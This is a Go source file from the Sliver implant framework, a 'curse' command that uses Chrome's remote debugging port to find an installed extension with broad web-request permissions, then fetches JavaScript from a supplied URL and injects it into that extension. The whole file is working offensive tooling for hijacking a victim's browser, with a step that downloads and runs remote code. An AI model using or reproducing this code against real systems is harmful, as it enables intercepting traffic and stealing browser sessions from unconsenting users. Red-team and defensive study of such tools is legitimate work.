package cmd

/*
	Sliver Implant Framework
	Copyright (C) 2020  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"

	"github.com/moloch--/sliver-overlord/pkg/overlord"
	"github.com/spf13/cobra"
)

var (
	cursedChromePermissions    = []string{overlord.AllURLs, overlord.WebRequest, overlord.WebRequestBlocking}
	cursedChromePermissionsAlt = []string{overlord.AllHTTP, overlord.AllHTTPS, overlord.WebRequest, overlord.WebRequestBlocking}
)

var curseCmd = &cobra.Command{
	Use:   "curse",
	Short: "",
	Long:  ``,
	Run: func(cmd *cobra.Command, args []string) {
		debuggingPort, err := cmd.Flags().GetInt(remoteDebuggingPortFlagStr)
		if err != nil {
			fmt.Printf(Warn+"Failed to parse --%s flag: %s\n", remoteDebuggingPortFlagStr, err)
			os.Exit(ExitBadFlag)
		}
		if debuggingPort < 1 || 65535 < debuggingPort {
			fmt.Printf(Warn+"Invalid port number %d\n", debuggingPort)
			os.Exit(ExitBadFlag)
		}
		jsURL, err := cmd.Flags().GetString(jsCodeURLFlagStr)
		if err != nil {
			fmt.Printf(Warn+"Failed to parse --%s flag: %s\n", jsCodeURLFlagStr, err)
			os.Exit(ExitBadFlag)
		}

		debugURL := url.URL{
			Scheme: "http",
			Host:   fmt.Sprintf("localhost:%d", debuggingPort),
			Path:   "/json",
		}

		// Find with primary permissions
		target, err := overlord.FindExtensionWithPermissions(debugURL.String(), cursedChromePermissions)
		if err != nil {
			fmt.Printf(Warn+"%s\n", err)
			os.Exit(ExitDebugQueryError)
		}
		if target == nil {
			// Look for alternate permissions
			target, err = overlord.FindExtensionWithPermissions(debugURL.String(), cursedChromePermissionsAlt)
			if err != nil {
				fmt.Printf(Warn+"%s\n", err)
				os.Exit(ExitDebugQueryError)
			}
		}
		if target == nil {
			fmt.Println(Warn + "No valid injection targets found.")
			return
		}

		jsCode, err := fetchJSCode(jsURL)
		if err != nil {
			fmt.Printf(Warn+"%s\n", err)
			os.Exit(ExitNoJSPayload)
		}
		_, err = overlord.ExecuteJS(target.ID, target.WebSocketDebuggerURL, jsCode)
		if err != nil {
			fmt.Printf(Warn+"%s\n", err)
			os.Exit(ExitExecuteJSError)
		}
	},
}

// fetchJSCode - Fetch JS code
func fetchJSCode(jsURL string) (string, error) {
	resp, err := http.Get(jsURL)
	if err != nil {
		return "", err
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(data), err
}